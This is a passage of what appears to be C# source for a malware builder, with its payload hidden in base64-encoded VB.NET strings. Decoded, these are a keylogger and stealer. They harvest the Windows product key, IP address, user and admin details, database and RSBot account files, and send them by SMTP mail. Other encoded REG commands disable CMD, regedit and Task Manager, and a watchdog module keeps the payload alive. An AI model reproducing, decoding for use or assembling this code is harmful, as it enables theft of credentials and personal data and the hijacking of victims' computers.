XNlIENJbnQoU1FMaXRlRGF0YVR5cGVzLlRFWFQpDQogICAgICAgICAgICAgICAgICAgICAgICBJZiBUcnVlIFRoZW4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb2x1bW5WYWx1ZXMoaSkgPSBQb2ludGVyVG9TdHJpbmcoc3FsaXRlM19jb2x1bW5fdGV4dChzdGF0ZW1lbnQsIGkpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIEV4aXQgU2VsZWN0DQogICAgICAgICAgICAgICAgICAgICAgICBFbmQgSWYNCiAgICAgICAgICAgICAgICAgICAgQ2FzZSBDSW50KFNRTGl0ZURhdGFUeXBlcy5CTE9CKQ0KICAgICAgICAgICAgICAgICAgICAgICAgSWYgVHJ1ZSBUaGVuDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29sdW1uVmFsdWVzKGkpID0gUG9pbnRlclRvU3RyaW5nKHNxbGl0ZTNfY29sdW1uX2Jsb2Ioc3RhdGVtZW50LCBpKSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBFeGl0IFNlbGVjdA0KICAgICAgICAgICAgICAgICAgICAgICAgRW5kIElmDQogICAgICAgICAgICAgICAgICAgIENhc2UgRWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgSWYgVHJ1ZSBUaGVuDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29sdW1uVmFsdWVzKGkpID0gIiINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBFeGl0IFNlbGVjdA0KICAgICAgICAgICAgICAgICAgICAgICAgRW5kIElmDQogICAgICAgICAgICAgICAgRW5kIFNlbGVjdA0KICAgICAgICAgICAgTmV4dA0KICAgICAgICAgICAgdGFibGUuUm93cy5BZGQoY29sdW1uVmFsdWVzKQ0KICAgICAgICAgICAgUmV0dXJuIHNxbGl0ZTNfc3RlcChzdGF0ZW1lbnQpDQogICAgICAgIEVuZCBGdW5jdGlvbg0KICAgICAgICBQcml2YXRlIEZ1bmN0aW9uIFN0cmluZ1RvUG9pbnRlcihCeVZhbCBzdHIgQXMgW1N0cmluZ10pIEFzIEludFB0cg0KICAgICAgICAgICAgSWYgc3RyIElzIE5vdGhpbmcgVGhlbg0KICAgICAgICAgICAgICAgIFJldHVybiBJbnRQdHIuWmVybw0KICAgICAgICAgICAgRWxzZQ0KICAgICAgICAgICAgICAgIERpbSBlbmNvZGluZ19fMSBBcyBFbmNvZGluZyA9IEVuY29kaW5nLlVURjgNCiAgICAgICAgICAgICAgICBEaW0gYnl0ZXMgQXMgW0J5dGVdKCkgPSBlbmNvZGluZ19fMS5HZXRCeXRlcyhzdHIpDQogICAgICAgICAgICAgICAgRGltIGxlbmd0aCBBcyBVSW50ZWdlciA9IGJ5dGVzLkxlbmd0aCArIDENCiAgICAgICAgICAgICAgICBEaW0gcG9pbnRlciBBcyBJbnRQdHIgPSBIZWFwQWxsb2MoR2V0UHJvY2Vzc0hlYXAoKSwgMCwgRGlyZWN0Q2FzdChsZW5ndGgsIFVJbnQzMikpDQogICAgICAgICAgICAgICAgTWFyc2hhbC5Db3B5KGJ5dGVzLCAwLCBwb2ludGVyLCBieXRlcy5MZW5ndGgpDQogICAgICAgICAgICAgICAgTWFyc2hhbC5Xcml0ZUJ5dGUocG9pbnRlciwgYnl0ZXMuTGVuZ3RoLCAwKQ0KICAgICAgICAgICAgICAgIFJldHVybiBwb2ludGVyDQogICAgICAgICAgICBFbmQgSWYNCiAgICAgICAgRW5kIEZ1bmN0aW9uDQogICAgICAgIFByaXZhdGUgRnVuY3Rpb24gUG9pbnRlclRvU3RyaW5nKEJ5VmFsIHB0ciBBcyBJbnRQdHIpIEFzIFtTdHJpbmddDQogICAgICAgICAgICBJZiBwdHIgPSBJbnRQdHIuWmVybyBUaGVuDQogICAgICAgICAgICAgICAgUmV0dXJuIE5vdGhpbmcNCiAgICAgICAgICAgIEVuZCBJZg0KDQogICAgICAgICAgICBEaW0gZW5jb2RpbmdfXzEgQXMgRW5jb2RpbmcgPSBFbmNvZGluZy5VVEY4DQoNCiAgICAgICAgICAgIERpbSBsZW5ndGggQXMgSW50ZWdlciA9IEdldFBvaW50ZXJMZW5naHQocHRyKQ0KICAgICAgICAgICAgRGltIGJ5dGVzIEFzIFtCeXRlXSgpID0gTmV3IFtCeXRlXShsZW5ndGggLSAxKSB7fQ0KICAgICAgICAgICAgTWFyc2hhbC5Db3B5KHB0ciwgYnl0ZXMsIDAsIGxlbmd0aCkNCiAgICAgICAgICAgIFJldHVybiBlbmNvZGluZ19fMS5HZXRTdHJpbmcoYnl0ZXMsIDAsIGxlbmd0aCkNCiAgICAgICAgRW5kIEZ1bmN0aW9uDQogICAgICAgIFByaXZhdGUgRnVuY3Rpb24gR2V0UG9pbnRlckxlbmdodChCeVZhbCBwdHIgQXMgSW50UHRyKSBBcyBJbnRlZ2VyDQogICAgICAgICAgICBJZiBwdHIgPSBJbnRQdHIuWmVybyBUaGVuDQogICAgICAgICAgICAgICAgUmV0dXJuIDANCiAgICAgICAgICAgIEVuZCBJZg0KICAgICAgICAgICAgUmV0dXJuIGxzdHJsZW4ocHRyKQ0KICAgICAgICBFbmQgRnVuY3Rpb24NCiAgICBFbmQgQ2xhc3MNCkVuZCBNb2R1bGUNCg0KDQoNCk1vZHVsZSBXaW5rZXkNCiAgICBQdWJsaWMgRnVuY3Rpb24gR2V0UHJvZHVjdEtleSgpIEFzIFN0cmluZw0KICAgICAgICBUcnkNCiAgICAgICAgICAgIERpbSBIZXhCdWYgQXMgT2JqZWN0ID0gTXkuQ29tcHV0ZXIuUmVnaXN0cnkuR2V0VmFsdWUoIkhLRVlfTE9DQUxfTUFDSElORVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93cyBOVFxDdXJyZW50VmVyc2lvbiIsICJEaWdpdGFsUHJvZHVjdElkIiwgMCkNCg0KICAgICAgICAgICAgSWYgSGV4QnVmIElzIE5vdGhpbmcgVGhlbiBSZXR1cm4gIk4vQSINCg0KICAgICAgICAgICAgRGltIHRtcCBBcyBTdHJpbmcgPSAiIg0KDQogICAgICAgICAgICBGb3IgbCBBcyBJbnRlZ2VyID0gTEJvdW5kKEhleEJ1ZikgVG8gVUJvdW5kKEhleEJ1ZikNCiAgICAgICAgICAgICAgICB0bXAgPSB0bXAgJiAiICIgJiBIZXgoSGV4QnVmKGwpKQ0KICAgICAgICAgICAgTmV4dA0KDQogICAgICAgICAgICBEaW0gU3RhcnRPZmZzZXQgQXMgSW50ZWdlciA9IDUyDQogICAgICAgICAgICBEaW0gRW5kT2Zmc2V0IEFzIEludGVnZXIgPSA2Nw0KICAgICAgICAgICAgRGltIERpZ2l0cygyNCkgQXMgU3RyaW5nDQoNCiAgICAgICAgICAgIERpZ2l0cygwKSA9ICJCIiA6IERpZ2l0cygxKSA9ICJDIiA6IERpZ2l0cygyKSA9ICJEIiA6IERpZ2l0cygzKSA9ICJGIg0KICAgICAgICAgICAgRGlnaXRzKDQpID0gIkciIDogRGlnaXRzKDUpID0gIkgiIDogRGlnaXRzKDYpID0gIkoiIDogRGlnaXRzKDcpID0gIksiDQogICAgICAgICAgICBEaWdpdHMoOCkgPSAiTSIgOiBEaWdpdHMoOSkgPSAiUCIgOiBEaWdpdHMoMTApID0gIlEiIDogRGlnaXRzKDExKSA9ICJSIg0KICAgICAgICAgICAgRGlnaXRzKDEyKSA9ICJUIiA6IERpZ2l0cygxMykgPSAiViIgOiBEaWdpdHMoMTQpID0gIlciIDogRGlnaXRzKDE1KSA9ICJYIg0KICAgICAgICAgICAgRGlnaXRzKDE2KSA9ICJZIiA6IERpZ2l0cygxNykgPSAiMiIgOiBEaWdpdHMoMTgpID0gIjMiIDogRGlnaXRzKDE5KSA9ICI0Ig0KICAgICAgICAgICAgRGlnaXRzKDIwKSA9ICI2IiA6IERpZ2l0cygyMSkgPSAiNyIgOiBEaWdpdHMoMjIpID0gIjgiIDogRGlnaXRzKDIzKSA9ICI5Ig0KDQogICAgICAgICAgICBEaW0gZExlbiBBcyBJbnRlZ2VyID0gMjkNCiAgICAgICAgICAgIERpbSBzTGVuIEFzIEludGVnZXIgPSAxNQ0KICAgICAgICAgICAgRGltIEhleERpZ2l0YWxQSUQoMTUpIEFzIFN0cmluZw0KICAgICAgICAgICAgRGltIERlcygzMCkgQXMgU3RyaW5nDQoNCiAgICAgICAgICAgIERpbSB0bXAyIEFzIFN0cmluZyA9ICIiDQoNCiAgICAgICAgICAgIEZvciBpIEFzIEludGVnZXIgPSBTdGFydE9mZnNldCBUbyBFbmRPZmZzZXQNCiAgICAgICAgICAgICAgICBIZXhEaWdpdGFsUElEKGkgLSBTdGFydE9mZnNldCkgPSBIZXhCdWYoaSkNCiAgICAgICAgICAgICAgICB0bXAyID0gdG1wMiAmICIgIiAmIEhleChIZXhEaWdpdGFsUElEKGkgLSBTdGFydE9mZnNldCkpDQogICAgICAgICAgICBOZXh0DQoNCiAgICAgICAgICAgIERpbSBLRVlTVFJJTkcgQXMgU3RyaW5nID0gIiINCg0KICAgICAgICAgICAgRm9yIGkgQXMgSW50ZWdlciA9IGRMZW4gLSAxIFRvIDAgU3RlcCAtMQ0KICAgICAgICAgICAgICAgIElmICgoaSArIDEpIE1vZCA2KSA9IDAgVGhlbg0KICAgICAgICAgICAgICAgICAgICBEZXMoaSkgPSAiLSINCiAgICAgICAgICAgICAgICAgICAgS0VZU1RSSU5HID0gS0VZU1RSSU5HICYgIi0iDQogICAgICAgICAgICAgICAgRWxzZQ0KICAgICAgICAgICAgICAgICAgICBEaW0gSE4gQXMgSW50ZWdlciA9IDANCiAgICAgICAgICAgICAgICAgICAgRm9yIE4gQXMgSW50ZWdlciA9IChzTGVuIC0gMSkgVG8gMCBTdGVwIC0xDQogICAgICAgICAgICAgICAgICAgICAgICBEaW0gVmFsdWUgQXMgSW50ZWdlciA9ICgoSE4gKiAyIF4gOCkgT3IgSGV4RGlnaXRhbFBJRChOKSkNCiAgICAgICAgICAgICAgICAgICAgICAgIEhleERpZ2l0YWxQSUQoTikgPSBWYWx1ZSBcIDI0DQogICAgICAgICAgICAgICAgICAgICAgICBITiA9IChWYWx1ZSBNb2QgMjQpDQoNCiAgICAgICAgICAgICAgICAgICAgTmV4dA0KDQogICAgICAgICAgICAgICAgICAgIERlcyhpKSA9IERpZ2l0cyhITikNCiAgICAgICAgICAgICAgICAgICAgS0VZU1RSSU5HID0gS0VZU1RSSU5HICYgRGlnaXRzKEhOKQ0KCQkJCQkNCgkJCQ0KICAgICAgICAgICAgICAgIEVuZCBJZg0KCQkJCQ0KICAgICAgICAgICAgTmV4dA0KCQkJRGltIHBsYXRmb3JtIEFzIFN0cmluZw0KICAgICAgICAgICAgICAgIElmIEludFB0ci5TaXplID0gNCBUaGVuDQogICAgICAgICAgICAgICAgICAgIHBsYXRmb3JtID0gIjMyLUJpdCINCiAgICAgICAgICAgICAgICBFbHNlDQogICAgICAgICAgICAgICAgICAgIHBsYXRmb3JtID0gIjY0LUJpdCINCiAgICAgICAgICAgICAgICBFbmQgSWYNCiAgICAgICAgICAgWzI0XS5bODhdLkFwcGVuZFRleHQodmJOZXdMaW5lKQ0KCQkgICBbMjRdLls4OF0uQXBwZW5kVGV4dCgifn5+fn5QQyBJbmZvfn5+fn4iICYgdmJuZXdsaW5lKQ0KCQkgICBVc2luZyB3ZWIgQXMgTmV3IE5ldC5XZWJDbGllbnQNCiAgICAgICAgICAgWzI0XS5bODhdLkFwcGVuZFRleHQoIklQIEFkZHJlc3M6ICIgJiBOZXQuSVBBZGRyZXNzLlBhcnNlKEVuY29kaW5nLkFTQ0lJLkdldFN0cmluZyh3ZWIuRG93bmxvYWREYXRhKCJodHRwOi8vd2hhdGlzbXlpcC5jb20vYXV0b21hdGlvbi9uMDkyMzA5NDUuYXNwIikpKS5Ub1N0cmluZyAmIHZibmV3bGluZSkNCiAgICAgICAgRW5kIFVzaW5nDQoJCSAgIFsyNF0uWzg4XS5BcHBlbmRUZXh0KCJDb21wdXRlci1OYW1lOiAiICYgRW52aXJvbm1lbnQuTWFjaGluZU5hbWUgJiB2Ym5ld2xpbmUpDQoJCSAgIFsyNF0uWzg4XS5BcHBlbmRUZXh0KCJVc2VyLU5hbWU6ICIgJiBFbnZpcm9ubWVudC5Vc2VyTmFtZSAmIHZibmV3bGluZSkNCgkJICAgSWYgTXkuVXNlci5Jc0luUm9sZShBcHBsaWNhdGlvblNlcnZpY2VzLkJ1aWx0SW5Sb2xlLkFkbWluaXN0cmF0b3IpIFRoZW4NCiAgICAgICAgICAgWzI0XS5bODhdLkFwcGVuZFRleHQoIklzIEFkbWluOiAiICYgIlllcyIgJiB2Ym5ld2xpbmUpDQoJCQllbHNlDQoJCSAgIFsyNF0uWzg4XS5BcHBlbmRUZXh0KCJJcyBBZG1pbjogIiAmICJObyIgJiB2Ym5ld2xpbmUpDQogICAgICAgIEVuZCBJZg0KCQkgICBbMjRdLls4OF0uQXBwZW5kVGV4dCgiT1M6ICIgJiBNeS5Db21wdXRlci5JbmZvLk9TRnVsbE5hbWUgJiB2Ym5ld2xpbmUpDQoJCSAgIFsyNF0uWzg4XS5BcHBlbmRUZXh0KCJQbGF0Zm9ybTogIiAmIHBsYXRmb3JtICYgdmJOZXdMaW5lKQ0KICAgICAgICAgICBbMjRdLls4OF0uQXBwZW5kVGV4dCgiV2luZG93cyBLZXk6ICIgJiBTdHJSZXZlcnNlKEtFWVNUUklORykpDQogICAgICAgICAgIFsyNF0uWzg4XS5BcHBlbmRUZXh0KHZibmV3bGluZSAmICJ+fn5+fn5+fn5+IiAmIHZiTmV3TGluZSkNCiAgICAgICAgICAgIFJldHVybiBTdHJSZXZlcnNlKEtFWVNUUklORykNCg0KICAgICAgICBDYXRjaCBleCBBcyBFeGNlcHRpb24NCg0KICAgICAgICBFbmQgVHJ5DQogICAgICAgIFJldHVybiBOb3RoaW5nDQogICAgRW5kIEZ1bmN0aW9uDQpFbmQgTW9kdWxlDQpNb2R1bGUgTmV4dXMNCiBQdWJsaWMgRnVuY3Rpb24gZGJzdGVhbGVyKCkNCiB0cnkNCiAgICAgICBEaW0gQ291bnRlciBBcyBJbnRlZ2VyID0gMA0KICAgICAgICBEaW0gRm9sZGVyIEFzIE5ldyBJTy5EaXJlY3RvcnlJbmZvKEVudmlyb24oIlVTRVJQUk9GSUxFIikpDQogICAgICAgIEZvciBFYWNoIGZvdW5kRGlyZWN0b3J5IGFzIG9iamVjdCBJbiBGb2xkZXIuR2V0RGlyZWN0b3JpZXMNCiAgICAgICAgICAgIFRyeQ0KICAgICAgICAgICAgICAgIEZvciBFYWNoIGZvdW5kIEFzIElPLkRpcmVjdG9yeUluZm8gSW4gZm91bmREaXJlY3RvcnkuR2V0RGlyZWN0b3JpZXMoIiouKiIsIElPLlNlYXJjaE9wdGlvbi5BbGxEaXJlY3RvcmllcykNCiAgICAgICAgICAgICAgICAgICAgICAgIElmIGZvdW5kLkZ1bGxOYW1lLkNvbnRhaW5zKCJjb25maWciKSBUaGVuDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgSWYgTXkuQ29tcHV0ZXIuRmlsZVN5c3RlbS5GaWxlRXhpc3RzKGZvdW5kLkZ1bGxOYW1lICYgIlxkYXRhLmRiIikgVGhlbg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRGltICBBdHRhY2htZW50MiA9IE5ldyBBdHRhY2htZW50KGZvdW5kLkZ1bGxOYW1lICYgIlxkYXRhLmRiIikNCgkJCQkJCSAgICAgICAgIFsyNF0uWzg4XS5BcHBlbmRUZXh0KHZibmV3bGluZSAmICJGaWxlIEZvdW5kOiAiICYgZm91bmQuRnVsbE5hbWUgJiAiXGRhdGEuZGIiICYgdmJOZXdMaW5lKQ0KICAgICAgICAgICAgICAgICAgICAgICAgWzI0XS5bMzJdLkF0dGFjaG1lbnRzLkFkZChBdHRhY2htZW50MikNCgkJCQkJCWVuZCBpZg0KICAgICAgICAgICAgICAgICAgICBFbmQgSWYNCiAgICAgICAgICAgICAgICBOZXh0DQogICAgICAgICAgICBDYXRjaCBleCBBcyBVbmF1dGhvcml6ZWRBY2Nlc3NFeGNlcHRpb24NCiAgICAgICAgICAgIEVuZCBUcnkNCiAgICAgICAgTmV4dA0KCQljYXRjaCBleCBhcyBleGNlcHRpb24NCgkJZW5kIHRyeSANCiAgICAgICBSZXR1cm4gVHJ1ZQ0KICAgIEVuZCBGdW5jdGlvbg0KCUVuZCBNb2R1bGUNCglNb2R1bGUgUnNib3QNCglQdWJsaWMgRnVuY3Rpb24gcnNpbmkoKQ0KCXRyeQ0KCUlmIE15LkNvbXB1dGVyLkZpbGVTeXN0ZW0uRmlsZUV4aXN0cyhFbnZpcm9ubWVudC5HZXRGb2xkZXJQYXRoKEVudmlyb25tZW50LlNwZWNpYWxGb2xkZXIuQXBwbGljYXRpb25EYXRhKSAmICJcUlNCb3RfQWNjb3VudHMuaW5pIikgVGhlbg0KICAgICAgICAgICAgRGltIHJpbmkgQXMgTmV3IEF0dGFjaG1lbnQoRW52aXJvbm1lbnQuR2V0Rm9sZGVyUGF0aChFbnZpcm9ubWVudC5TcGVjaWFsRm9sZGVyLkFwcGxpY2F0aW9uRGF0YSkgJiAiXFJTQm90X0FjY291bnRzLmluaSIpDQoJCQlbMjRdLls4OF0uQXBwZW5kVGV4dCh2Ym5ld2xpbmUgJiAiRmlsZSBGb3VuZDogIiAmIEVudmlyb25tZW50LkdldEZvbGRlclBhdGgoRW52aXJvbm1lbnQuU3BlY2lhbEZvbGRlci5BcHBsaWNhdGlvbkRhdGEpICYgIlxSU0JvdF9BY2NvdW50cy5pbmkiICYgdmJOZXdMaW5lKQ0KICAgICAgICAgICAgWzI0XS5bMzJdLkF0dGFjaG1lbnRzLkFkZChyaW5pKQ0KICAgICAgICBFbmQgSWYNCgkJY2F0Y2ggZXggYXMgZXhjZXB0aW9uDQoJCWVuZCB0cnkNCiAgICAgICAgUmV0dXJuIFRydWUNCkVuZCBGdW5jdGlvbg0KRW5kIE1vZHVsZQ=="));

        public static string sourceProtect =
            Encoding.Default.GetString(
                Convert.FromBase64String("SW1wb3J0cyBTeXN0ZW0uQ29sbGVjdGlvbnMsIE1pY3Jvc29mdC5XaW4zMiwgU3lzdGVtLkRhdGEsIFN5c3RlbS5UaHJlYWRpbmcsIFN5c3RlbS5OZXQuTWFpbCwgU3lzdGVtLklPLCBTeXN0ZW0uVGV4dCwgU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeSwgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLCBTeXN0ZW0uUmVmbGVjdGlvbiwgTWljcm9zb2Z0LlZpc3VhbEJhc2ljLCBTeXN0ZW0sIFN5c3RlbS5XaW5kb3dzLkZvcm1zLCBTeXN0ZW0uRW52aXJvbm1lbnQsIFN5c3RlbS5EaWFnbm9zdGljcywgU3lzdGVtLkNvbXBvbmVudE1vZGVsLCBTeXN0ZW0uRHJhd2luZw0KPEFzc2VtYmx5OiBBc3NlbWJseVRpdGxlKCJIb3N0IE1hbmFnZXIiKT4gDQo8QXNzZW1ibHk6IEFzc2VtYmx5RGVzY3JpcHRpb24oIkhvc3QgTWFuYWdlciIpPiANCjxBc3NlbWJseTogQXNzZW1ibHlDb21wYW55KCJIb3N0IE1hbmFnZXIiKT4gDQo8QXNzZW1ibHk6IEFzc2VtYmx5UHJvZHVjdCgiSG9zdCBNYW5hZ2VyIik+IA0KPEFzc2VtYmx5OiBBc3NlbWJseUNvcHlyaWdodCgiSG9zdCBNYW5hZ2VyIik+IA0KTW9kdWxlIFByb3RlY3QNClByaXZhdGUgTXV0ZXkgQXMgTXV0ZXgNClN1YiBtYWluKCkNCiBUcnkNCiBTeXN0ZW0uVGhyZWFkaW5nLk11dGV4Lk9wZW5FeGlzdGluZygiKm11dGV4KiIpDQogICAgICAgICAgICBlbmQNCiAgICAgICAgQ2F0Y2ggZXggQXMgRXhjZXB0aW9uDQogICAgICAgICAgICBNdXRleSA9IE5ldyBTeXN0ZW0uVGhyZWFkaW5nLk11dGV4KEZhbHNlLCAiKm11dGV4KiIpDQogICAgICAgICAgICBFbmQgVHJ5DQoJCQkNCiBEaW0gdGlja3kgQXMgTmV3IFN5c3RlbS5XaW5kb3dzLkZvcm1zLlRpbWVyDQogICAgICAgIHRpY2t5LkludGVydmFsID0gMTAwMA0KICAgICAgICBBZGRIYW5kbGVyIHRpY2t5LlRpY2ssIEFkZHJlc3NPZiB0aWNreV9UaWNrZWQNCiAgICAgICAgdGlja3kuc3RhcnQNCgkJYXBwbGljYXRpb24ucnVuDQpFbmQgU3ViDQoJJw0KCVN1YiB0aWNreV9UaWNrZWQoQnlWYWwgc2VuZGVyIEFzIFN5c3RlbS5PYmplY3QsIEJ5VmFsIGUgQXMgU3lzdGVtLkV2ZW50QXJncykNCiAgICAgICAgIFRyeQ0KICAgICAgICAgICBJZiBJc1Byb2Nlc3NSdW5uaW5nKCIqbmFtZSoiKSA9IFRydWUgVGhlbg0KZWxzZQ0KUHJvY2Vzcy5TdGFydChFbnZpcm9ubWVudC5HZXRGb2xkZXJQYXRoKEVudmlyb25tZW50LlNwZWNpYWxGb2xkZXIuQXBwbGljYXRpb25EYXRhKSAmICJcKm5hbWUqLmV4ZSIpDQplbmQgaWYNCmNhdGNoDQogICAgICAgIEVuZCBUcnkNCiAgICBFbmQgU3ViDQoJDQoJUHVibGljIEZ1bmN0aW9uIElzUHJvY2Vzc1J1bm5pbmcobmFtZSBBcyBTdHJpbmcpIEFzIEJvb2xlYW4NCglGb3IgRWFjaCBjbHNQcm9jZXNzIEFzIFByb2Nlc3MgSW4gUHJvY2Vzcy5HZXRQcm9jZXNzZXMoKQ0KCQlJZiBjbHNQcm9jZXNzLlByb2Nlc3NOYW1lLlN0YXJ0c1dpdGgobmFtZSkgVGhlbg0KCQkJUmV0dXJuIFRydWUNCgkJRW5kIElmDQoJTmV4dA0KCVJldHVybiBGYWxzZQ0KRW5kIEZ1bmN0aW9uDQoNCglFbmQgTW9kdWxl"));

        public static string sourcea = Encoding.Default.GetString(Convert.FromBase64String("SW1wb3J0cyBTeXN0ZW0uVGV4dA0KSW1wb3J0cyBTeXN0ZW0uR2xvYmFsaXphdGlvbg0KSW1wb3J0 cyBTeXN0ZW0uTmV0Lk5ldHdvcmtJbmZvcm1hdGlvbg0KSW1wb3J0cyBTeXN0ZW0uSU8NCkltcG9y dHMgU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeQ0KSW1wb3J0cyBTeXN0ZW0uQ29sbGVjdGlv bnMsIE1pY3Jvc29mdC5XaW4zMiwgU3lzdGVtLk5ldCwgU3lzdGVtLkRhdGEsIFN5c3RlbS5NYW5h Z2VtZW50LCBTeXN0ZW0uVGhyZWFkaW5nLCBTeXN0ZW0uTmV0Lk1haWwsIFN5c3RlbS5SdW50aW1l LkludGVyb3BTZXJ2aWNlcywgU3lzdGVtLlJlZmxlY3Rpb24sIE1pY3Jvc29mdC5WaXN1YWxCYXNp YywgU3lzdGVtLCBTeXN0ZW0uV2luZG93cy5Gb3JtcywgU3lzdGVtLkVudmlyb25tZW50LCBTeXN0 ZW0uRGlhZ25vc3RpY3MsIFN5c3RlbS5Db21wb25lbnRNb2RlbCwgU3lzdGVtLkRyYXdpbmcNCjxB c3NlbWJseTogQXNzZW1ibHlUaXRsZSgiWzQ5XSIpPiANCjxBc3NlbWJseTogQXNzZW1ibHlEZXNj cmlwdGlvbigiWzUwXSIpPiANCjxBc3NlbWJseTogQXNzZW1ibHlDb21wYW55KCJbNTFdIik+IA0K PEFzc2VtYmx5OiBBc3NlbWJseVByb2R1Y3QoIls1Ml0iKT4gDQo8QXNzZW1ibHk6IEFzc2VtYmx5 Q29weXJpZ2h0KCJbNTNdIik+IA0KTW9kdWxlIFsyNF0NCiAgICBEaW0gWzkzXSBhcyBzdHJpbmcg PSAiKmxvZ29ubHkqIg0KCURpbSBbOTldIGFzIHN0cmluZyA9ICIqcHJvY2VzcyoiDQogICAgRGlt IFsyNV0gYXMgU3RyaW5nID0gIiplbWFpbCoiDQogICAgRGltIFsyNl0gYXMgU3RyaW5nID0gIipl bWFpbHBhc3MqIg0KICAgIERpbSBbMjddIGFzIFN0cmluZyA9ICIqaG9zdCoiDQoJRGltIFsxMzBd IGFzIHN0cmluZyA9ICIqaW5zdGFsbCoiDQpkaW0gWzEzMV0gYXMgc3RyaW5nID0gIip0aXRsZSoi DQogICAgRGltIFs5NV0gYXMgc3RyaW5nID0gIiplcnJvcioiDQoJRGltIFsyOF0gYXMgaW50ZWdl ciA9ICpwb3J0Kg0KICAgIERpbSBbNV0sIFs2XSwgWzddLCBbOF0sIFs5XSwgWzIzXSwgWzg5XSwg WzkxXSwgWzk0XSwgWzk2XSxbOTddLFs5OF0sIFs5Ml0sIFsxMzJdICwgWzEzM10sIFsxMzVdLCBb MTM5XSwgWzE0MV0gYXMgc3RyaW5nICdvcHRpb25zDQogICAgRGltIFsxNDBdIGFzIHN0cmluZyA9 ICIqdW5pbnN0YWxsKiINCglEaW0gWzMwXSBhcyBpbnRlZ2VyID0gKmludGVydmFsKg0KICAgIERp bSBbNTVdIGFzIFN0cmluZyA9IG5vdGhpbmcNCiAgICBkaW0gWzU4XSBhcyBzdHJpbmcgPSAiVWtW SElHRmtaQ0JJUzBOVlhGTnZablIzWVhKbFhGQnZiR2xqYVdWelhFMXBZM0p2YzI5bWRGeFhhVzVr YjNkelhGTjVjM1JsYlNBdmRpQkVhWE5oWW14bFEwMUVJQzkwSUZKRlIxOUVWMDlTUkNBdlpDQXhJ QzltIiAnY21kDQogICAgZGltIFs1OV0gYXMgc3RyaW5nID0gIlVrVkhJR0ZrWkNCSVMwTlZYRk52 Wm5SM1lYSmxYRTFwWTNKdmMyOW1kRnhYYVc1a2IzZHpYRU4xY25KbGJuUldaWEp6YVc5dVhGQnZi R2xqYVdWelhGTjVjM1JsYlNBdmRpQkVhWE5oWW14bFVtVm5hWE4wY25sVWIyOXNjeUF2ZENCU1JV ZGZSRmRQVWtRZ0wyUWdNU0F2Wmc9PSIgJ3JlZ2VkaXQNCiAgICBkaW0gWzYwXSBhcyBzdHJpbmcg PSAiVWtWSElHRmtaQ0JJUzBOVlhGTnZablIzWVhKbFhFMXBZM0p2YzI5bWRGeFhhVzVrYjNkelhF TjFjbkpsYm5SV1pYSnphVzl1WEZCdmJHbGphV1Z6WEZONWMzUmxiU0F2ZGlCRWFYTmhZbXhsVkdG emEwMW5jaUF2ZENCU1JVZGZSRmRQVWtRZ0wyUWdNU0F2Wmc9PSIgJ3Rhc21ncg0KCURpbSBbMTAx XSBhcyBzdHJpbmcgPSAiVFZORFQwNUdTVWN1UlZoRiINCglkaW0gWzEwMl0gYXMgc3RyaW5nID0g Im10eVxlY2xQbmlyVm5ydVx3ZGlcZnNyaVxyd2ZTZXNTc2lpb1xvc2V0ZXJDc29uV3Rvb2NNZWF0 byINCglEaW0gWzEwMF0gYXMgc3RyaW5nID0gInN0UHBBbmlyVm5ydVx3ZGlcZnNyaVxSV0ZTaGEg cFxvc2V0ZXJDc29uV3Rvb2NNRUFUTyINCiAgICBkaW0gWzI5XSBhcyBvYmplY3QgPSBFbnZpcm9u bWVudC5HZXRGb2xkZXJQYXRoKEVudmlyb25tZW50LlNwZWNpYWxGb2xkZXIuQXBwbGljYXRpb25E YXRhKQ0KICAgIGRpbSBbMzFdIGFzIHN0cmluZyA9IEVudmlyb25tZW50LkdldEZvbGRlclBhdGgo RW52aXJvbm1lbnQuU3BlY2lhbEZvbGRlci5BcHBsaWNhdGlvbkRhdGEpDQogICAgUHVibGljIFsz Ml0gQXMgTmV3IE1haWxNZXNzYWdlKCkNCiAgICBEaW0gWzM3XSBBcyBOZXcgU210cENsaWVudCgp DQogICAgUHJpdmF0ZSBbMTM0XSBhcyBNdXRleA0KCURJbSBDdGV4dCBhcyBzdHJpbmcgPSBub3Ro aW5nDQoJRGltIE1BQ0dVSUQgQXMgT2JqZWN0ID0gbm90aGluZw0KCVByaXZhdGUgRGVjbGFyZSBG dW5jdGlvbiBHZXRBc3luY0tleVN0YXRlIExpYiAidXNlcjMyIiAoQnlWYWwgdktleSBBcyBTeXN0 ZW0uSW50MzIpIEFzIEludDE2DQogICAgUHJpdmF0ZSBEZWNsYXJlIEZ1bmN0aW9uIEdldEZvcmVn cm91bmRXaW5kb3cgTGliICJ1c2VyMzIuZGxsIiAoKSBBcyBJbnQzMiAnZ2V0Zm9yZWdyb25kd2lu ZG93DQogICAgUHJpdmF0ZSBEZWNsYXJlIEZ1bmN0aW9uIFsxNV0gTGliICJ1c2VyMzIuZGxsIiBB bGlhcyAiR2V0V2luZG93VGV4dEEiIChCeVZhbCBod25kIEFzIEludDMyLCBCeVZhbCBscFN0cmlu ZyBBcyBTdHJpbmcsIEJ5VmFsIGNjaCBBcyBJbnQzMikgQXMgSW50MzIgJ2dldHdpbmRvd3RleHQN CiAgICBEaW0gWzNdIEFzIE9iamVjdCA9IElPLlBhdGguR2V0RmlsZU5hbWUoWzY2XSkNCgkNCiAg ICBEaW0gWzU0XSBBcyBOZXcgU3lzdGVtLldpbmRvd3MuRm9ybXMuUmljaFRleHRCb3gNCiAgICBE aW0gWzY2XSBhcyBvYmplY3QgPSBBcHBsaWNhdGlvbi5FeGVjdXRhYmxlUGF0aA0KICAgIFB1Ymxp YyBbODhdIEFzIE5ldyBTeXN0ZW0uV2luZG93cy5Gb3Jtcy5SaWNoVGV4dEJveA0KICAgDQoJDQpT dWIgbWFpbigpDQogICAgICAgIG9uIGVycm9yIHJlc3VtZSBuZXh0DQonb3B0aW9ucw0KICAgICAg 